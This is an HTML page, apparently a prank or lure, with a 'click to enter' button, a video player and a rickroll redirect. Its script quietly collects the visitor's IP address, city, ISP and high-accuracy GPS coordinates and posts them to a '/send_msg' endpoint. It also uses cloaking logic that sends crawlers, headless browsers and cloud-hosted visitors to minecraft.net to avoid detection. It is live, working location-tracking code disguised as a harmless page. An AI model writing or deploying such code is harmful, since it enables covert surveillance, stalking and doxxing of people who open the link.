<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Q74 SUP </title>
    <link rel="preconnect" href="https://api.ipify.org">
    <link rel="preconnect" href="https://icanhazip.com">
    <link rel="preconnect" href="https://ipapi.co">
</head>
<body style="display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;">
<button id="downloadBtn" style="padding:20px;font-size:18px;line-height:1.6;">
click to enter<br>
Click en Entrar<br>
点击 进入
</button>

<!-- 新增播放器，默认隐藏，不干扰原有页面 -->
<div id="videoBox" style="display:none;width:90%;max-width:800px;position:absolute;top:20px;">
    <video id="mainVideo" controls width="100%">
        <source id="videoSrc" src="" type="video/mp4">
        您浏览器不支持视频播放
    </video>
</div>

<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
const lockTime = 5 * 60 * 1000;
const jumpUrl = "http://full.rickroll.info/";
const minecraftRedirect = "https://www.minecraft.net/es-es/";

// ======================
// 视频固定使用仓库本地mp4，不分国内外
const VIDEO_CN  = "在此粘贴国内mp4直链";
const VIDEO_OVERSEA = "在此粘贴海外mp4直链";
// 本地视频文件名（mp4放在github仓库根目录）
const LOCAL_MP4 = "video_260822_202145.mp4";
// ======================

axios.defaults.timeout = 6000;
let ipData = {ip:"获取失败",country:"-",city:"-",region:"-",isp:"-"};
let gpsInfo = "未发起定位请求";
let sendLock = false;
let gpsTriggered = false;
let ipFullyLoaded = false;
let ipLock = {ip:"",time:0};

try{
    const cache = localStorage.getItem("lastIp");
    ipLock = cache ? JSON.parse(cache) : {ip:"",time:0};
}catch(e){
    ipLock = {ip:"",time:0};
    localStorage.setItem("lastIp",JSON.stringify(ipLock));
}

const blockWords = ["bot","spider","crawler","headless","scraper","preview","selenium","puppeteer","robot"];
const cloudProviders = ["HostRoyale","DigitalOcean","Linode","Vultr","Hetzner","Amazon","AWS","Azure","Google Cloud","OVH","Contabo","Packet","Ramnode","AlibabaCloud","TencentCloud"];
const ua = navigator.userAgent.toLowerCase();
const isRobot = blockWords.some(word => ua.includes(word));

function isCloudISP(isp){
    if(!isp) return false;
    const lowIsp = isp.toLowerCase();
    return cloudProviders.some(name=> lowIsp.includes(name.toLowerCase()));
}

// 【修改】不再判断国家，全部直接加载本地视频
function playBranchVideo(){
    let targetVideoUrl = LOCAL_MP4;
    document.getElementById("videoSrc").src = targetVideoUrl;
    document.getElementById("mainVideo").load();
    document.getElementById("videoBox").style.display = "block";
}

if(isRobot){
    location.href = minecraftRedirect;
}else{
    async function getIPInfo(){
        let realIP = null;
        try{
            const ipRes = await axios.get("https://api.ipify.org?format=json");
            realIP = ipRes.data.ip;
        }catch(err){
            try{
                const backupIp = await axios.get("https://icanhazip.com");
                realIP = backupIp.data.trim();
            }catch(err2){
                ipData.ip = "两个IP接口全部请求失败";
                ipFullyLoaded = true;
                if(!gpsTriggered) getGPS();
                return;
            }
        }
        const now = Date.now();
        if(ipLock.ip === realIP && (now - ipLock.time) < lockTime){
            ipFullyLoaded = true;
            if(!gpsTriggered) getGPS();
            return;
        }
        localStorage.setItem("lastIp", JSON.stringify({ip:realIP, time:now}));
        try{
            const infoRes = await axios.get(`https://ipapi.co/${realIP}/json/`);
            ipData = {
                ip: infoRes.data.ip || realIP,
                country: infoRes.data.country_name || "-",
                city: infoRes.data.city || "-",
                region: infoRes.data.region || "-",
                isp: infoRes.data.org || "-"
            };
            if(isCloudISP(ipData.isp)){
                location.href = minecraftRedirect;
                return;
            }
        }catch(err){
            ipData.ip = realIP;
        }
        ipFullyLoaded = true;
        if(!gpsTriggered) getGPS();
    }

    function getGPS(){
        if(gpsTriggered) return;
        gpsTriggered = true;
        if(!navigator.geolocation){
            gpsInfo = "浏览器禁止地理位置API";
            sendData();
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos)=>{
                gpsInfo = `纬度:${pos.coords.latitude} | 经度:${pos.coords.longitude}`;
                sendData();
            },
            (err)=>{
                switch(err.code){
                    case 1: gpsInfo = "访客手动拒绝GPS定位权限";break;
                    case 2: gpsInfo = "地理位置数据无法获取";break;
                    case 3: gpsInfo = "GPS请求8秒超时未响应";break;
                    default:gpsInfo = `定位异常错误码:${err.code}`;
                }
                sendData();
            },
            {enableHighAccuracy:true,timeout:8000,maximumAge:0}
        );
    }

    async function sendData(){
        if(sendLock) return;
        sendLock = true;
        const postData = {
            ip:ipData.ip,
            country:ipData.country,
            city:ipData.city,
            region:ipData.region,
            isp:ipData.isp,
            gps:gpsInfo,
            ua:navigator.userAgent
        };
        await axios.post("/send_msg",postData);
    }

    document.getElementById("downloadBtn").addEventListener("click",async ()=>{
        while(!ipFullyLoaded){
            await new Promise(resolve=>setTimeout(resolve,200));
        }
        gpsTriggered = false;
        await getGPS();

        playBranchVideo();

        setTimeout(()=>{
            location.href = jumpUrl;
        },3000);
    });
    getIPInfo();
}
</script>
</body>
</html>
